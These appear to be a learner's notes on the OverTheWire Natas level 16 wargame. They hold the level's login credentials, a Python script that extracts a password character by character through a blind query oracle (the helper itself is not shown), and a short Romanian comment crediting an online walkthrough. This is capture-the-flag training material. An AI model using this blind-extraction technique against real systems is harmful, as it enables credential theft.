
# General info

Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL:      http://natas16.natas.labs.overthewire.org

# Special code section

```py
possible_chars = "bhjkoqsvwCEFHJLNOT05789"
password = ""

while True:
    old_pass = password
    for c in possible_chars:
        if simple_query(char=password+c):
            password += c
            print(f"Password until now: {password}  {len(password)} / 32")
    if old_pass == password:
        break
    
while True:
    old_pass = password
    for c in possible_chars:
        if simple_query(char=c+password):
            password = c + password
            print(f"Password until now: {password}  {len(password)} / 32")
    if old_pass == password:
        break

print(password)
```


A fost un nivel foarte dificil, m am incurcat in calcule.
Am reusit sa ajung singur la o idee de executie, dar nu am reusit sa aflu mai multe.
Pe scurt, trebuia sa incerc sa verific caractere rand pe rand.

Am inteles rezolvarea, dar e dificila si mi-e greu sa o explic.
Am luat-o de aici: https://learnhacking.io/overthewire-natas-level-16-walkthrough/